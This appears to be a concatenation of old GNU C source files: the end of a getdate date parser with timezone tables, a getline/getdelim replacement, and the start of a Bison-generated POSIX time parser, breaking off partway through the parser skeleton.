    { "est",	tZONE,     HOUR ( 5) },	/* Eastern Standard */
    { "edt",	tDAYZONE,  HOUR ( 5) },	/* Eastern Daylight */
    { "cst",	tZONE,     HOUR ( 6) },	/* Central Standard */
    { "cdt",	tDAYZONE,  HOUR ( 6) },	/* Central Daylight */
    { "mst",	tZONE,     HOUR ( 7) },	/* Mountain Standard */
    { "mdt",	tDAYZONE,  HOUR ( 7) },	/* Mountain Daylight */
    { "pst",	tZONE,     HOUR ( 8) },	/* Pacific Standard */
    { "pdt",	tDAYZONE,  HOUR ( 8) },	/* Pacific Daylight */
    { "yst",	tZONE,     HOUR ( 9) },	/* Yukon Standard */
    { "ydt",	tDAYZONE,  HOUR ( 9) },	/* Yukon Daylight */
    { "hst",	tZONE,     HOUR (10) },	/* Hawaii Standard */
    { "hdt",	tDAYZONE,  HOUR (10) },	/* Hawaii Daylight */
    { "cat",	tZONE,     HOUR (10) },	/* Central Alaska */
    { "ahst",	tZONE,     HOUR (10) },	/* Alaska-Hawaii Standard */
    { "nt",	tZONE,     HOUR (11) },	/* Nome */
    { "idlw",	tZONE,     HOUR (12) },	/* International Date Line West */
    { "cet",	tZONE,     -HOUR (1) },	/* Central European */
    { "met",	tZONE,     -HOUR (1) },	/* Middle European */
    { "mewt",	tZONE,     -HOUR (1) },	/* Middle European Winter */
    { "mest",	tDAYZONE,  -HOUR (1) },	/* Middle European Summer */
    { "mesz",	tDAYZONE,  -HOUR (1) },	/* Middle European Summer */
    { "swt",	tZONE,     -HOUR (1) },	/* Swedish Winter */
    { "sst",	tDAYZONE,  -HOUR (1) },	/* Swedish Summer */
    { "fwt",	tZONE,     -HOUR (1) },	/* French Winter */
    { "fst",	tDAYZONE,  -HOUR (1) },	/* French Summer */
    { "eet",	tZONE,     -HOUR (2) },	/* Eastern Europe, USSR Zone 1 */
    { "bt",	tZONE,     -HOUR (3) },	/* Baghdad, USSR Zone 2 */
#if 0
    { "it",	tZONE,     -HOUR (3.5) },/* Iran */
#endif
    { "zp4",	tZONE,     -HOUR (4) },	/* USSR Zone 3 */
    { "zp5",	tZONE,     -HOUR (5) },	/* USSR Zone 4 */
#if 0
    { "ist",	tZONE,     -HOUR (5.5) },/* Indian Standard */
#endif
    { "zp6",	tZONE,     -HOUR (6) },	/* USSR Zone 5 */
#if	0
    /* For completeness.  NST is also Newfoundland Standard, and SST is
     * also Swedish Summer. */
    { "nst",	tZONE,     -HOUR (6.5) },/* North Sumatra */
    { "sst",	tZONE,     -HOUR (7) },	/* South Sumatra, USSR Zone 6 */
#endif	/* 0 */
    { "wast",	tZONE,     -HOUR (7) },	/* West Australian Standard */
    { "wadt",	tDAYZONE,  -HOUR (7) },	/* West Australian Daylight */
#if 0
    { "jt",	tZONE,     -HOUR (7.5) },/* Java (3pm in Cronusland!) */
#endif
    { "cct",	tZONE,     -HOUR (8) },	/* China Coast, USSR Zone 7 */
    { "jst",	tZONE,     -HOUR (9) },	/* Japan Standard, USSR Zone 8 */
#if 0
    { "cast",	tZONE,     -HOUR (9.5) },/* Central Australian Standard */
    { "cadt",	tDAYZONE,  -HOUR (9.5) },/* Central Australian Daylight */
#endif
    { "east",	tZONE,     -HOUR (10) },	/* Eastern Australian Standard */
    { "eadt",	tDAYZONE,  -HOUR (10) },	/* Eastern Australian Daylight */
    { "gst",	tZONE,     -HOUR (10) },	/* Guam Standard, USSR Zone 9 */
    { "nzt",	tZONE,     -HOUR (12) },	/* New Zealand */
    { "nzst",	tZONE,     -HOUR (12) },	/* New Zealand Standard */
    { "nzdt",	tDAYZONE,  -HOUR (12) },	/* New Zealand Daylight */
    { "idle",	tZONE,     -HOUR (12) },	/* International Date Line East */
    {  NULL  }
};

/* Military timezone table. */
static TABLE const MilitaryTable[] = {
    { "a",	tZONE,	HOUR (  1) },
    { "b",	tZONE,	HOUR (  2) },
    { "c",	tZONE,	HOUR (  3) },
    { "d",	tZONE,	HOUR (  4) },
    { "e",	tZONE,	HOUR (  5) },
    { "f",	tZONE,	HOUR (  6) },
    { "g",	tZONE,	HOUR (  7) },
    { "h",	tZONE,	HOUR (  8) },
    { "i",	tZONE,	HOUR (  9) },
    { "k",	tZONE,	HOUR ( 10) },
    { "l",	tZONE,	HOUR ( 11) },
    { "m",	tZONE,	HOUR ( 12) },
    { "n",	tZONE,	HOUR (- 1) },
    { "o",	tZONE,	HOUR (- 2) },
    { "p",	tZONE,	HOUR (- 3) },
    { "q",	tZONE,	HOUR (- 4) },
    { "r",	tZONE,	HOUR (- 5) },
    { "s",	tZONE,	HOUR (- 6) },
    { "t",	tZONE,	HOUR (- 7) },
    { "u",	tZONE,	HOUR (- 8) },
    { "v",	tZONE,	HOUR (- 9) },
    { "w",	tZONE,	HOUR (-10) },
    { "x",	tZONE,	HOUR (-11) },
    { "y",	tZONE,	HOUR (-12) },
    { "z",	tZONE,	HOUR (  0) },
    { NULL }
};




/* ARGSUSED */
static int
yyerror (s)
    char	*s;
{
  return 0;
}


static time_t
ToSeconds (Hours, Minutes, Seconds, Meridian)
    time_t	Hours;
    time_t	Minutes;
    time_t	Seconds;
    MERIDIAN	Meridian;
{
  if (Minutes < 0 || Minutes > 59 || Seconds < 0 || Seconds > 59)
    return -1;
  switch (Meridian) {
  case MER24:
    if (Hours < 0 || Hours > 23)
      return -1;
    return (Hours * 60L + Minutes) * 60L + Seconds;
  case MERam:
    if (Hours < 1 || Hours > 12)
      return -1;
    if (Hours == 12)
      Hours = 0;
    return (Hours * 60L + Minutes) * 60L + Seconds;
  case MERpm:
    if (Hours < 1 || Hours > 12)
      return -1;
    if (Hours == 12)
      Hours = 0;
    return ((Hours + 12) * 60L + Minutes) * 60L + Seconds;
  default:
    abort ();
  }
  /* NOTREACHED */
}


static time_t
Convert (Month, Day, Year, Hours, Minutes, Seconds, Meridian, DSTmode)
    time_t	Month;
    time_t	Day;
    time_t	Year;
    time_t	Hours;
    time_t	Minutes;
    time_t	Seconds;
    MERIDIAN	Meridian;
    DSTMODE	DSTmode;
{
  static int DaysInMonth[12] = {
    31, 0, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31
  };
  time_t	tod;
  time_t	Julian;
  int		i;

  if (Year < 0)
    Year = -Year;
  if (Year < DOOMSDAY-2000)
    Year += 2000;
  else if (Year < 100)
    Year += 1900;
  DaysInMonth[1] = Year % 4 == 0 && (Year % 100 != 0 || Year % 400 == 0)
    ? 29 : 28;
  if (Year < EPOCH || Year >= DOOMSDAY
      || Month < 1 || Month > 12
      /* Lint fluff:  "conversion from long may lose accuracy" */
      || Day < 1 || Day > DaysInMonth[(int)--Month])
    return -1;

  for (Julian = Day - 1, i = 0; i < Month; i++)
    Julian += DaysInMonth[i];
  for (i = EPOCH; i < Year; i++)
    Julian += 365 + (i % 4 == 0);
  Julian *= SECSPERDAY;
  Julian += yyTimezone * 60L;
  if ((tod = ToSeconds (Hours, Minutes, Seconds, Meridian)) < 0)
    return -1;
  Julian += tod;
  if (DSTmode == DSTon
      || (DSTmode == DSTmaybe && localtime (&Julian)->tm_isdst))
    Julian -= 60 * 60;
  return Julian;
}


static time_t
DSTcorrect (Start, Future)
    time_t	Start;
    time_t	Future;
{
  time_t	StartDay;
  time_t	FutureDay;

  StartDay = (localtime (&Start)->tm_hour + 1) % 24;
  FutureDay = (localtime (&Future)->tm_hour + 1) % 24;
  return (Future - Start) + (StartDay - FutureDay) * 60L * 60L;
}


static time_t
RelativeDate (Start, DayOrdinal, DayNumber)
    time_t	Start;
    time_t	DayOrdinal;
    time_t	DayNumber;
{
  struct tm	*tm;
  time_t	now;

  now = Start;
  tm = localtime (&now);
  now += SECSPERDAY * ((DayNumber - tm->tm_wday + 7) % 7);
  now += 7 * SECSPERDAY * (DayOrdinal <= 0 ? DayOrdinal : DayOrdinal - 1);
  return DSTcorrect (Start, now);
}


static time_t
RelativeMonth (Start, RelMonth)
    time_t	Start;
    time_t	RelMonth;
{
  struct tm	*tm;
  time_t	Month;
  time_t	Year;

  if (RelMonth == 0)
    return 0;
  tm = localtime (&Start);
  Month = 12 * (1900 + tm->tm_year) + tm->tm_mon + RelMonth;
  Year = Month / 12;
  Month = Month % 12 + 1;
  return DSTcorrect (Start,
		     Convert (Month, (time_t)tm->tm_mday, Year,
			      (time_t)tm->tm_hour, (time_t)tm->tm_min, (time_t)tm->tm_sec,
			      MER24, DSTmaybe));
}


static int
LookupWord (buff)
    char		*buff;
{
  register char	*p;
  register char	*q;
  register const TABLE	*tp;
  int			i;
  int			abbrev;

  /* Make it lowercase. */
  for (p = buff; *p; p++)
    if (isupper (*p))
      *p = tolower (*p);

  if (strcmp (buff, "am") == 0 || strcmp (buff, "a.m.") == 0) {
    yylval.Meridian = MERam;
    return tMERIDIAN;
  }
  if (strcmp (buff, "pm") == 0 || strcmp (buff, "p.m.") == 0) {
    yylval.Meridian = MERpm;
    return tMERIDIAN;
  }

  /* See if we have an abbreviation for a month. */
  if (strlen (buff) == 3)
    abbrev = 1;
  else if (strlen (buff) == 4 && buff[3] == '.') {
    abbrev = 1;
    buff[3] = '\0';
  }
  else
    abbrev = 0;

  for (tp = MonthDayTable; tp->name; tp++) {
    if (abbrev) {
      if (strncmp (buff, tp->name, 3) == 0) {
	yylval.Number = tp->value;
	return tp->type;
      }
    }
    else if (strcmp (buff, tp->name) == 0) {
      yylval.Number = tp->value;
      return tp->type;
    }
  }

  for (tp = TimezoneTable; tp->name; tp++)
    if (strcmp (buff, tp->name) == 0) {
      yylval.Number = tp->value;
      return tp->type;
    }

  if (strcmp (buff, "dst") == 0)
    return tDST;

  for (tp = UnitsTable; tp->name; tp++)
    if (strcmp (buff, tp->name) == 0) {
      yylval.Number = tp->value;
      return tp->type;
    }

  /* Strip off any plural and try the units table again. */
  i = strlen (buff) - 1;
  if (buff[i] == 's') {
    buff[i] = '\0';
    for (tp = UnitsTable; tp->name; tp++)
      if (strcmp (buff, tp->name) == 0) {
	yylval.Number = tp->value;
	return tp->type;
      }
    buff[i] = 's';		/* Put back for "this" in OtherTable. */
  }

  for (tp = OtherTable; tp->name; tp++)
    if (strcmp (buff, tp->name) == 0) {
      yylval.Number = tp->value;
      return tp->type;
    }

  /* Military timezones. */
  if (buff[1] == '\0' && isalpha (*buff)) {
    for (tp = MilitaryTable; tp->name; tp++)
      if (strcmp (buff, tp->name) == 0) {
	yylval.Number = tp->value;
	return tp->type;
      }
  }

  /* Drop out any periods and try the timezone table again. */
  for (i = 0, p = q = buff; *q; q++)
    if (*q != '.')
      *p++ = *q;
    else
      i++;
  *p = '\0';
  if (i)
    for (tp = TimezoneTable; tp->name; tp++)
      if (strcmp (buff, tp->name) == 0) {
	yylval.Number = tp->value;
	return tp->type;
      }

  return tID;
}


static int
yylex ()
{
  register char	c;
  register char	*p;
  char		buff[20];
  int			Count;
  int			sign;

  for ( ; ; ) {
    while (isspace (*yyInput))
      yyInput++;

    if (isdigit (c = *yyInput) || c == '-' || c == '+') {
      if (c == '-' || c == '+') {
	sign = c == '-' ? -1 : 1;
	if (!isdigit (*++yyInput))
	  /* skip the '-' sign */
	  continue;
      }
      else
	sign = 0;
      for (yylval.Number = 0; isdigit (c = *yyInput++); )
	yylval.Number = 10 * yylval.Number + c - '0';
      yyInput--;
      if (sign < 0)
	yylval.Number = -yylval.Number;
      return sign ? tSNUMBER : tUNUMBER;
    }
    if (isalpha (c)) {
      for (p = buff; isalpha (c = *yyInput++) || c == '.'; )
	if (p < &buff[sizeof buff - 1])
	  *p++ = c;
      *p = '\0';
      yyInput--;
      return LookupWord (buff);
    }
    if (c != '(')
      return *yyInput++;
    Count = 0;
    do {
      c = *yyInput++;
      if (c == '\0')
	return c;
      if (c == '(')
	Count++;
      else if (c == ')')
	Count--;
    } while (Count > 0);
  }
}

#define TM_YEAR_ORIGIN 1900

/* Yield A - B, measured in seconds.  */
static long
difftm (a, b)
     struct tm *a, *b;
{
  int ay = a->tm_year + (TM_YEAR_ORIGIN - 1);
  int by = b->tm_year + (TM_YEAR_ORIGIN - 1);
  long days = (
	       /* difference in day of year */
	       a->tm_yday - b->tm_yday
	       /* + intervening leap days */
	       +  ((ay >> 2) - (by >> 2))
	       -  (ay/100 - by/100)
	       +  ((ay/100 >> 2) - (by/100 >> 2))
	       /* + difference in years * 365 */
	       +  (long)(ay-by) * 365
	       );
  return (60*(60*(24*days + (a->tm_hour - b->tm_hour))
	      + (a->tm_min - b->tm_min))
	  + (a->tm_sec - b->tm_sec));
}

time_t
get_date (p, now)
    char		*p;
    struct timeb	*now;
{
  struct tm		*tm, gmt;
  struct timeb	ftz;
  time_t		Start;
  time_t		tod;

  yyInput = p;
  if (now == NULL) {
    now = &ftz;
    (void)time (&ftz.time);

    if (! (tm = gmtime (&ftz.time)))
      return -1;
    gmt = *tm;			/* Make a copy, in case localtime modifies *tm.  */

    if (! (tm = localtime (&ftz.time)))
      return -1;

    ftz.timezone = difftm (&gmt, tm) / 60;
    if (tm->tm_isdst)
      ftz.timezone += 60;
  }

  tm = localtime (&now->time);
  yyYear = tm->tm_year;
  yyMonth = tm->tm_mon + 1;
  yyDay = tm->tm_mday;
  yyTimezone = now->timezone;
  yyDSTmode = DSTmaybe;
  yyHour = 0;
  yyMinutes = 0;
  yySeconds = 0;
  yyMeridian = MER24;
  yyRelSeconds = 0;
  yyRelMonth = 0;
  yyHaveDate = 0;
  yyHaveDay = 0;
  yyHaveRel = 0;
  yyHaveTime = 0;
  yyHaveZone = 0;

  if (yyparse ()
      || yyHaveTime > 1 || yyHaveZone > 1 || yyHaveDate > 1 || yyHaveDay > 1)
    return -1;

  if (yyHaveDate || yyHaveTime || yyHaveDay) {
    Start = Convert (yyMonth, yyDay, yyYear, yyHour, yyMinutes, yySeconds,
		     yyMeridian, yyDSTmode);
    if (Start < 0)
      return -1;
  }
  else {
    Start = now->time;
    if (!yyHaveRel)
      Start -= ((tm->tm_hour * 60L + tm->tm_min) * 60L) + tm->tm_sec;
  }

  Start += yyRelSeconds;
  Start += RelativeMonth (Start, yyRelMonth);

  if (yyHaveDay && !yyHaveDate) {
    tod = RelativeDate (Start, yyDayOrdinal, yyDayNumber);
    Start += tod;
  }

  /* Have to do *something* with a legitimate -1 so it's distinguishable
   * from the error return value.  (Alternately could set errno on error.) */
  return Start == -1 ? 0 : Start;
}


#if	defined (TEST)

/* ARGSUSED */
int
main (ac, av)
    int		ac;
    char	*av[];
{
  char buff[MAX_BUFF_LEN + 1];
  time_t d;

  (void)printf ("Enter date, or blank line to exit.\n\t> ");
  (void)fflush (stdout);

  buff[MAX_BUFF_LEN] = 0;
  while (fgets (buff, MAX_BUFF_LEN, stdin) && buff[0]) {
    d = get_date (buff, (struct timeb *)NULL);
    if (d == -1)
      (void)printf ("Bad format - couldn't convert.\n");
    else
      (void)printf ("%s", ctime (&d));
    (void)printf ("\t> ");
    (void)fflush (stdout);
  }
  exit (0);
  /* NOTREACHED */
}
#endif	/* defined (TEST) */
/* getline.c -- Replacement for GNU C library function getline

Copyright (C) 1993, 1996 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA. */

/* Written by Jan Brittenson, bson@gnu.ai.mit.edu.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

/* The `getdelim' function is only declared if there following symbol
   is defined.  */
#define _GNU_SOURCE	1
#include <stdio.h>
#include <sys/types.h>

#if defined __GNU_LIBRARY__ && defined HAVE_GETDELIM

int
getline (lineptr, n, stream)
     char **lineptr;
     size_t *n;
     FILE *stream;
{
  return getdelim (lineptr, n, '\n', stream);
}


#else /* ! have getdelim */

#define NDEBUG
#include <assert.h>

#if STDC_HEADERS
# include <stdlib.h>
#else
char *malloc (), *realloc ();
#endif

/* Always add at least this many bytes when extending the buffer.  */
#define MIN_CHUNK 64

/* Read up to (and including) a TERMINATOR from STREAM into *LINEPTR
   + OFFSET (and null-terminate it). *LINEPTR is a pointer returned from
   malloc (or NULL), pointing to *N characters of space.  It is realloc'd
   as necessary.  Return the number of characters read (not including the
   null terminator), or -1 on error or EOF.  */

int
getstr (lineptr, n, stream, terminator, offset)
     char **lineptr;
     size_t *n;
     FILE *stream;
     char terminator;
     size_t offset;
{
  int nchars_avail;		/* Allocated but unused chars in *LINEPTR.  */
  char *read_pos;		/* Where we're reading into *LINEPTR. */
  int ret;

  if (!lineptr || !n || !stream)
    return -1;

  if (!*lineptr)
    {
      *n = MIN_CHUNK;
      *lineptr = malloc (*n);
      if (!*lineptr)
	return -1;
    }

  nchars_avail = *n - offset;
  read_pos = *lineptr + offset;

  for (;;)
    {
      register int c = getc (stream);

      /* We always want at least one char left in the buffer, since we
	 always (unless we get an error while reading the first char)
	 NUL-terminate the line buffer.  */

      assert(*n - nchars_avail == read_pos - *lineptr);
      if (nchars_avail < 2)
	{
	  if (*n > MIN_CHUNK)
	    *n *= 2;
	  else
	    *n += MIN_CHUNK;

	  nchars_avail = *n + *lineptr - read_pos;
	  *lineptr = realloc (*lineptr, *n);
	  if (!*lineptr)
	    return -1;
	  read_pos = *n - nchars_avail + *lineptr;
	  assert(*n - nchars_avail == read_pos - *lineptr);
	}

      if (c == EOF || ferror (stream))
	{
	  /* Return partial line, if any.  */
	  if (read_pos == *lineptr)
	    return -1;
	  else
	    break;
	}

      *read_pos++ = c;
      nchars_avail--;

      if (c == terminator)
	/* Return the line.  */
	break;
    }

  /* Done - NUL terminate and return the number of chars read.  */
  *read_pos = '\0';

  ret = read_pos - (*lineptr + offset);
  return ret;
}

int
getline (lineptr, n, stream)
     char **lineptr;
     size_t *n;
     FILE *stream;
{
  return getstr (lineptr, n, stream, '\n', 0);
}

int
getdelim (lineptr, n, delimiter, stream)
     char **lineptr;
     size_t *n;
     int delimiter;
     FILE *stream;
{
  return getstr (lineptr, n, stream, delimiter, 0);
}
#endif

/*  A Bison parser, made from ./posixtm.y
 by  GNU Bison version 1.25
  */

#define YYBISON 1  /* Identify Bison output.  */

#define	DIGIT	258

#line 19 "./posixtm.y"


#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

/* The following block of alloca-related preprocessor directives is here
   solely to allow compilation by non GNU-C compilers of the C parser
   produced from this file by old versions of bison.  Newer versions of
   bison include a block similar to this one in bison.simple.  */
   
#ifdef __GNUC__
#define alloca __builtin_alloca
#else
#ifdef HAVE_ALLOCA_H
#include <alloca.h>
#else
#ifdef _AIX
 #pragma alloca
#else
void *alloca ();
#endif
#endif
#endif

#include <stdio.h>
#include <sys/types.h>

#ifdef TM_IN_SYS_TIME
#include <sys/time.h>
#else
#include <time.h>
#endif

/* Some old versions of bison generate parsers that use bcopy.
   That loses on systems that don't provide the function, so we have
   to redefine it here.  */
#if !defined (HAVE_BCOPY) && defined (HAVE_MEMCPY) && !defined (bcopy)
#define bcopy(from, to, len) memcpy ((to), (from), (len))
#endif

#define YYDEBUG 1

/* Lexical analyzer's current scan position in the input string. */
static char *curpos;

/* The return value. */
static struct tm t;

time_t mktime ();

#define zzparse posixtime_zzparse
static int zzlex ();
static int zzerror ();
#ifndef YYSTYPE
#define YYSTYPE int
#endif
#include <stdio.h>

#ifndef __cplusplus
#ifndef __STDC__
#define const
#endif
#endif



#define	YYFINAL		15
#define	YYFLAG		-32768
#define	YYNTBASE	5

#define YYTRANSLATE(x) ((unsigned)(x) <= 258 ? zztranslate[x] : 9)

static const char zztranslate[] = {     0,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     4,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     1,     2,     3
};

#if YYDEBUG != 0
static const short zzprhs[] = {     0,
     0,     7,     9,    12,    13,    14,    17
};

static const short zzrhs[] = {     8,
     8,     8,     8,     6,     7,     0,     8,     0,     8,     8,
     0,     0,     0,     4,     8,     0,     3,     3,     0
};

#endif

#if YYDEBUG != 0
static const short zzrline[] = { 0,
    78,   107,   114,   121,   132,   135,   144
};
#endif


#if YYDEBUG != 0 || defined (YYERROR_VERBOSE)

static const char * const zztname[] = {   "$","error","$undefined.","DIGIT",
"'.'","date","year","seconds","digitpair", NULL
};
#endif

static const short zzr1[] = {     0,
     5,     6,     6,     6,     7,     7,     8
};

static const short zzr2[] = {     0,
     6,     1,     2,     0,     0,     2,     2
};

static const short zzdefact[] = {     0,
     0,     0,     7,     0,     0,     4,     5,     2,     0,     1,
     3,     6,     0,     0,     0
};

static const short zzdefgoto[] = {    13,
     7,    10,     2
};

static const short zzpact[] = {     2,
     5,     2,-32768,     2,     2,     2,    -3,     2,     2,-32768,
-32768,-32768,     9,    10,-32768
};

static const short zzpgoto[] = {-32768,
-32768,-32768,    -2
};


#define	YYLAST		10


static const short zztable[] = {     4,
     9,     5,     6,     8,     1,    11,    12,     3,    14,    15
};

static const short zzcheck[] = {     2,
     4,     4,     5,     6,     3,     8,     9,     3,     0,     0
};
/* -*-C-*-  Note some compilers choke on comments on `#line' lines.  */
#line 3 "/p/share/bison.simple"

/* Skeleton output parser for bison,
   Copyright (C) 1984, 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* As a special exception, when this file is copied by Bison into a
   Bison output file, you may use that output file without restriction.
   This special exception was added by the Free Software Foundation
   in version 1.24 of Bison.  */

#ifndef alloca
#ifdef __GNUC__
#define alloca __builtin_alloca
#else /* not GNU C.  */
#if (!defined (__STDC__) && defined (sparc)) || defined (__sparc__) || defined (__sparc) || defined (__sgi)
#include <alloca.h>
#else /* not sparc */
#if defined (MSDOS) && !defined (__TURBOC__)
#include <malloc.h>
#else /* not MSDOS, or __TURBOC__ */
#if defined(_AIX)
#include <malloc.h>
 #pragma alloca
#else /* not MSDOS, __TURBOC__, or _AIX */
#ifdef __hpux
#ifdef __cplusplus
extern "C" {
void *alloca (unsigned int);
};
#else /* not __cplusplus */
void *alloca ();
#endif /* not __cplusplus */
#endif /* __hpux */
#endif /* not _AIX */
#endif /* not MSDOS, or __TURBOC__ */
#endif /* not sparc.  */
#endif /* not GNU C.  */
#endif /* alloca not defined.  */

/* This is the parser code that is written into each bison parser
  when the %semantic_parser declaration is not specified in the grammar.
  It was written by Richard Stallman by simplifying the hairy parser
  used when %semantic_parser is specified.  */

/* Note: there must be only one dollar sign in this file.
   It is replaced by the list of actions, each action
   as one case of the switch.  */

#define zzerrok		(zzerrstatus = 0)
#define zzclearin	(zzchar = YYEMPTY)
#define YYEMPTY		-2
#define YYEOF		0
#define YYACCEPT	return(0)
#define YYABORT 	return(1)
#define YYERROR		goto zzerrlab1
/* Like YYERROR except do call zzerror.
   This remains here temporarily to ease the
   transition to the new meaning of YYERROR, for GCC.
   Once GCC version 2 has supplanted version 1, this can go.  */
#define YYFAIL		goto zzerrlab
#define YYRECOVERING()  (!!zzerrstatus)
#define YYBACKUP(token, value) \
do								\
  if (zzchar == YYEMPTY && zzlen == 1)				\
    { zzchar = (token), zzlval = (value);			\
      zzchar1 = YYTRANSLATE (zzchar);				\
      YYPOPSTACK;						\
      goto zzbackup;						\
    }								\
  else								\
    { zzerror ("syntax error: cannot back up"); YYERROR; }	\
while (0)

#define YYTERROR	1
#define YYERRCODE	256

#ifndef YYPURE
#define YYLEX		zzlex()
#endif

#ifdef YYPURE
#ifdef YYLSP_NEEDED
#ifdef YYLEX_PARAM
#define YYLEX		zzlex(&zzlval, &zzlloc, YYLEX_PARAM)
#else
#define YYLEX		zzlex(&zzlval, &zzlloc)
#endif
#else /* not YYLSP_NEEDED */
#ifdef YYLEX_PARAM
#define YYLEX		zzlex(&zzlval, YYLEX_PARAM)
#else
#define YYLEX		zzlex(&zzlval)
#endif
#endif /* not YYLSP_NEEDED */
#endif

/* If nonreentrant, generate the variables here */

#ifndef YYPURE

int	zzchar;			/*  the lookahead symbol		*/
YYSTYPE	zzlval;			/*  the semantic value of the		*/
				/*  lookahead symbol			*/

#ifdef YYLSP_NEEDED
YYLTYPE zzlloc;			/*  location data for the lookahead	*/
				/*  symbol				*/
#endif

int zznerrs;			/*  number of parse errors so far       */
#endif  /* not YYPURE */

#if YYDEBUG != 0
int zzdebug;			/*  nonzero means print parse trace	*/
/* Since this is uninitialized, it does not stop multiple parsers
   from coexisting.  */
#endif

/*  YYINITDEPTH indicates the initial size of the parser's stacks	*/

#ifndef	YYINITDEPTH
#define YYINITDEPTH 200
#endif

/*  YYMAXDEPTH is the maximum size the stacks can grow to
    (effective only if the built-in stack extension method is used).  */

#if YYMAXDEPTH == 0
#undef YYMAXDEPTH
#endif

#ifndef YYMAXDEPTH
#define YYMAXDEPTH 10000
#endif

/* Prevent warning if -Wstrict-prototypes.  */
#ifdef __GNUC__
int zzparse (void);
#endif

#if __GNUC__ > 1		/* GNU C and GNU C++ define this.  */
#define __zz_memcpy(TO,FROM,COUNT)	__builtin_memcpy(TO,FROM,COUNT)
#else				/* not GNU C or C++ */
#ifndef __cplusplus

/* This is the most reliable way to avoid incompatibilities
   in available built-in functions on various systems.  */
static void
__zz_memcpy (to, from, count)
     char *to;
     char *from;
     int count;
{
  register char *f = from;
  register char *t = to;
  register int i = count;

  while (i-- > 0)
    *t++ = *f++;
}

#else /* __cplusplus */

/* This is the most reliable way to avoid incompatibilities
   in available built-in functions on various systems.  */
static void
__zz_memcpy (char *to, char *from, int count)
{
  register char *t = to;
  register char *f = from;
  register int i = count;

  while (i-- > 0)
    *t++ = *f++;
}

#endif
#endif

#line 196 "/p/share/bison.simple"

/* The user can define YYPARSE_PARAM as the name of an argument to be passed
   into zzparse.  The argument should have type void *.
   It should actually point to an object.
   Grammar actions can access the variable by casting it
   to the proper pointer type.  */

#ifdef YYPARSE_PARAM
#ifdef __cplusplus
#define YYPARSE_PARAM_ARG void *YYPARSE_PARAM
#define YYPARSE_PARAM_DECL
#else /* not __cplusplus */
#define YYPARSE_PARAM_ARG YYPARSE_PARAM
#define YYPARSE_PARAM_DECL void *YYPARSE_PARAM;
#endif /* not __cplusplus */
#else /* not YYPARSE_PARAM */
#define YYPARSE_PARAM_ARG
#define YYPARSE_PARAM_DECL
#endif /* not YYPARSE_PARAM */

int
zzparse(YYPARSE_PARAM_ARG)
     YYPARSE_PARAM_DECL
{
  register int zzstate;
  register int zzn;
  register short *zzssp;
  register YYSTYPE *zzvsp;
  int zzerrstatus;	/*  number of tokens to shift before error messages enabled */
  int zzchar1 = 0;		/*  lookahead token as an internal (translated) token number */

  short	zzssa[YYINITDEPTH];	/*  the state stack			*/
  YYSTYPE zzvsa[YYINITDEPTH];	/*  the semantic value stack		*/

  short *zzss = zzssa;		/*  refer to the stacks thru separate pointers */
  YYSTYPE *zzvs = zzvsa;	/*  to allow zzoverflow to reallocate them elsewhere */

#ifdef YYLSP_NEEDED
  YYLTYPE zzlsa[YYINITDEPTH];	/*  the location stack			*/
  YYLTYPE *zzls = zzlsa;
  YYLTYPE *zzlsp;

#define YYPOPSTACK   (zzvsp--, zzssp--, zzlsp--)
#else
#define YYPOPSTACK   (zzvsp--, zzssp--)
#endif

  int zzstacksize = YYINITDEPTH;

#ifdef YYPURE
  int zzchar;
  YYSTYPE zzlval;
  int zznerrs;
#ifdef YYLSP_NEEDED
  YYLTYPE zzlloc;
#endif
#endif

  YYSTYPE zzval;		/*  the variable used to return		*/
				/*  semantic values from the action	*/
				/*  routines				*/

  int zzlen;

#if YYDEBUG != 0
  if (zzdebug)
    fprintf(stderr, "Starting parse\n");
#endif

  zzstate = 0;
  zzerrstatus = 0;
  zznerrs = 0;
  zzchar = YYEMPTY;		/* Cause a token to be read.  */

  /* Initialize stack pointers.
     Waste one element of value and location stack
